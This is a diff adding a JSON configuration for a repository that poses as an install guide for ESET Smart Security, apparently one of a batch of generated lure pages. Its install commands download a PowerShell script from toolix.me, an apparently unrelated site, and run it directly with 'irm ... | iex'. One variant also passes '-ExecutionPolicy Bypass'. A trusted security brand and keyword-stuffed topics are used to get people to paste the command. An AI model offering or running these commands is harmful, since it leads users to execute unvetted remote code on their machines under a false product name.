@@ -1,0 +1,27 @@
+{
+  "repo": "ESET-Smart-Security-Desktop-Install",
+  "product": "ESET Smart Security Desktop Install",
+  "product_title": "ESET Smart Security Desktop Install",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "security",
+  "topics": [
+    "how-to-install-eset-smart-security-desktop",
+    "eset-smart-security-desktop-app",
+    "privacy-tools",
+    "network-security",
+    "firewall-client",
+    "endpoint-security",
+    "malware-defense",
+    "eset-smart-security-desktop-security-tool",
+    "eset-smart-security-desktop-antivirus-tool",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
